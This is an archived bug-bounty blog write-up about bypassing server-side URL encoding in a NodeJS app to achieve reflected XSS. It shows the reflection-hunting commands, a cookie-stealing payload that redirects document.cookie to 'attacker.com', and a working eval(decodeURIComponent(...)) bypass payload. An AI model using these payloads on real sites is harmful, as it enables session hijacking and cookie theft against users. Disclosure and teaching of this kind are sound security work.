# Genius XSS !

- **Source URL:** https://medium.com/@zatikyan.sevada/genius-xss-1dfa7d2d8e89?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250823081152/https://medium.com/@zatikyan.sevada/genius-xss-1dfa7d2d8e89
- **Fetched:** 2026-11-21
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/10479 (id 10479)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Bypassing URL Encoding for XSS — The Genius Trick

Hello fellas, hope you are doing great.

Before I start if you want to pass the challenge I made from the case I met in real app, and which I am about to tell right now, please pass the Lab 2 of my advanced XSS labs [here](https://github.com/Sevada797/cyber_inventions/tree/main/ADVANCED_XSS_LABS).

Okay story time — The bug I identified was in one of company I work with, targets.

I already hunted there 1 another XSS, so what came to my mind that time was to re-scan the target for another XSS (and get another BB :D ), so this time I used my tool HF(HTTP-find) from [B4](https://github.com/Sevada797/bash4hacking/) (there are lots of interesting tools BTW in this one repo), I went like

cat 4d | qsreplace “findmehere’\”>\<” > injected.txt && hf injected.txt findmehere --ua-chrome -A 800 -B 800


I also run \`hf menu file\` usually to get get all my used common commands for that specific url wordlist, this is my semi-automated hunting helper usage for reflections hunting.

Okay anyways, after this, I did

hf log | grep “findmehere’”


Okay actually I don’t remember how I noticed quickly (maybe done some hf log | grep -v … | grep “findmehere’” kinda magic) then I noticed an injection,

then doing

hf log | grep -i “findmehere‘%22%3E%3C’” -B 1


I got the link, where the injection happened (-B 1 shows one line before after grepped line)

so visiting the URL via view-source: prefix (it was redirecting so I used this trick, usually you can view the raw request HTTP response after visiting and hitting \`Ctrl+U\` and it will redirect you to \`view-source:https://…\`) I could confirm the injection here see the pic below

Okay but the thing is after detecting the injection, I also noticed that lots of chars were getting URL-encoded in the injection area, but not all !

And if you might have already guessed the back-end is NodeJS since, only there the default used **encodeURIComponent()** leaves some characters unescaped :) ( **-\_.!\~\*’()** these character)

Okay first of all I could give the security team a POC , saying hey guys see I can alert() here using

‘-alert()-’


payload, however the security team and the company itself sure would like to see impact, and as you can guess, for bare minimum attack we also need.. ‘/’ and ‘+’ charachters, so we can do maybe

‘-location.replace(‘//attacker.com/’+encodeURIComponent(document.cookie))-’


but sadly these were getting URL-encoded.

===============================================

So after 1 or 2 minutes something clicked in my head, I was like, ay yo wait…

Why not to to URL decode (decodeURIComponent()) if it’s getting URL encoded, and after, since it is a string, just pass it to eval LOL.

And it worked hella fine.

My final payload looked like this

findmehere’-eval(decodeURIComponent(‘alert(%22ahaha%20let%20me%20steal%20your%20cookies%22%2Bdocument.cookie)’))-’’


you can also see the reflected result in the pic

And for crafting payloads for XSS, I like using console, so I ran

\`https://www.REDACTED.com/some/endpoint?vulnParam=findmehere%27-\`+encodeURIComponent(\`eval(decodeURIComponent('alert("ahaha let me steal your cookies”+document.cookie)’))\`)+\`-%27\`


to get the final payload.

And that’s it, let the back-end URL-encoded it all expect some key chars, otherwise the attack would be impossible if all chars are URL-encoded, and whatever else they URL-encode, we just URL-decode it and pass to eval.

The write-up came to it’s end, hope you enjoyed it, if you enjoyed drop a clap :D

Also you can check my Github tools, and if you like them, again drop a star for sure \~\_\~

See you in the next write-up, happy bug-hunting, and don’t stop the hacker grind, always learn/try/exploit and just go for it.
